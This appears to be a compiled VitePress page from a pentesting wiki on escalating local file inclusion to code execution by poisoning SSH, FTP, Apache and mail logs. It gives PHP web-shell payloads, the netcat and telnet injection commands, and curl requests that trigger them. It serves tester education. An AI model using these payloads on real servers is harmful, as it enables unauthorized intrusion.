import{_ as i,c as a,a5 as e,o as n}from"./chunks/framework.B5CpDqM0.js";const c=JSON.parse('{"title":"logs poisoning","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"web/inputs/file-inclusion/lfi-to-rce/logs-poisoning.md","filePath":"web/inputs/file-inclusion/lfi-to-rce/logs-poisoning.md","lastUpdated":1724982529000}'),l={name:"web/inputs/file-inclusion/lfi-to-rce/logs-poisoning.md"};function t(p,s,h,o,k,r){return n(),a("div",null,s[0]||(s[0]=[e(`<h1 id="logs-poisoning" tabindex="-1">logs poisoning <a class="header-anchor" href="#logs-poisoning" aria-label="Permalink to &quot;logs poisoning&quot;">â€‹</a></h1><div class="warning custom-block"><p>Log files may be stored in different locations depending on the operating system/distribution.</p></div><details class="details custom-block"><summary>/var/log/auth.log</summary><p>For instance, the tester can try to log in with SSH using a crafted login. On a Linux system, the login will be echoed in <code>/var/log/auth.log</code>. By exploiting a Local File Inclusion, the attacker will be able to make the crafted login echoed in this file interpreted by the server.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Sending the payload via SSH</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ssh</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;&lt;php phpinfo(); ?&gt;&#39;@</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$TARGET</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Accessing the log file via LFI</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --user-agent</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;PENTEST&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $URL</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/?parameter=/var/log/auth.log</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&amp;cmd</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">id</span></span></code></pre></div></details><details class="details custom-block"><summary>/var/log/vsftpd.log</summary><p>When the FTP service is available, testers can try to access the <code>/var/log/vsftpd.log</code> and see if any content is displayed. If that&#39;s the case, log poisoning may be possible by connecting via FTP and sending a payload (depending on which web technology is used).</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Sending the payload via FTP</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ftp</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $TARGET_IP</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;&lt;php system($_GET[&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">cmd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;])?&gt;&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Accessing the log file via LFI</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --user-agent</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;PENTEST&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $URL</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/?parameter=/var/log/vsftpd.log</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&amp;cmd</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">id</span></span></code></pre></div></details><details class="details custom-block"><summary>/var/log/apache2/access.log</summary><p>When the web application is using an Apache 2 server, the <code>access.log</code> may be accessible using an LFI.</p><ul><li>About <code>access.log</code>: records all requests processed by the server.</li><li>About netcat: using netcat avoids URL encoding.</li></ul><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Sending the payload via netcat</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">nc</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $TARGET_IP $TARGET_PORT</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> GET /</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&lt;?</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">php passthru($_GET[</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;cmd&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]); </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">?</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt; </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">HTTP/1.1</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Host: $TARGET_IP</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Connection: close</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Accessing the log file via LFI</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --user-agent</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;PENTEST&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $URL</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/?parameter=/var/log/apache2/access.log</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&amp;cmd</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">id</span></span></code></pre></div><p>There are <a href="https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/" target="_blank" rel="noreferrer">some variations</a> of the <code>access.log</code> path and file depending on the operating system/distribution:</p><ul><li>RHEL / Red Hat / CentOS / Fedora Linux Apache access file location: <code>/var/log/httpd/access_log</code></li><li>Debian / Ubuntu Linux Apache access log file location: <code>/var/log/apache2</code>/access.log</li><li>FreeBSD Apache access log file location: <code>/var/log/httpd-access.log</code></li><li>Windows Apache access log file location: **** <code>C:\\xampp\\apache\\logs</code></li></ul><p>Or if the web server is under Nginx :</p><ul><li>Linux Nginx access log file location: <code>/var/log/nginx/access.log</code></li><li>Windows Nginx access log file location: <code>C:\\nginx\\log</code></li></ul></details><details class="details custom-block"><summary>/var/log/apache/error.log</summary><p>This one is similar to the <code>access.log</code>, but instead of putting simple requests in the log file, it will put errors in <code>error.log</code>.</p><ul><li>About <code>error.log</code>: records any errors encountered in processing requests.</li><li>About netcat: using netcat avoids URL encoding.</li></ul><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Sending the payload via netcat</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">nc</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $TARGET_IP $TARGET_PORT</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> GET /</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&lt;?</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">php passthru($_GET[</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;cmd&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]); </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">?</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt; </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">HTTP/1.1</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Host: $TARGET_IP</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Connection: close</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Accessing the log file via LFI</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --user-agent</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;PENTEST&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $URL</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/?parameter=/var/log/apache2/error.log</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&amp;cmd</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">id</span></span></code></pre></div><p>There are <a href="https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/" target="_blank" rel="noreferrer">some variations</a> of the <code>error.log</code> path and file depending on the operating system/distribution:</p><ul><li>RHEL / Red Hat / CentOS / Fedora Linux Apache error file location: <code>/var/log/httpd/error_log</code></li><li>Debian / Ubuntu Linux Apache error log file location: <code>/var/log/apache2/error.log</code></li><li>FreeBSD Apache error log file location: <code>/var/log/httpd-error.log</code></li><li>Windows Apache access log file location: **** <code>C:\\xampp\\apache\\logs</code></li></ul><p>Or if the web server is under Nginx :</p><ul><li>Linux Nginx access log file location: <code>/var/log/nginx</code></li><li>Windows Nginx access log file location: <code>C:\\nginx\\log</code></li></ul></details><details class="details custom-block"><summary>/var/log/mail.log</summary><p>When an SMTP server is running and writing logs in <code>/var/log/mail.log</code>, it&#39;s possible to inject a payload using telnet (as an example).</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Sending the payload via telnet</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">telnet</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $TARGET_IP $TARGET_PORT</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> MAIL FROM:</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&lt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">pentest@pentest.com</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> RCPT TO:</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&lt;?</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">php system($_GET[</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;cmd&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">]); </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">?</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Accessing the log file via LFI</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --user-agent</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;PENTEST&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">$URL</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">/?parameter=/var/log/mail.log&amp;cmd=id&quot;</span></span></code></pre></div></details>`,7)]))}const g=i(l,[["render",t]]);export{c as __pageData,g as default};
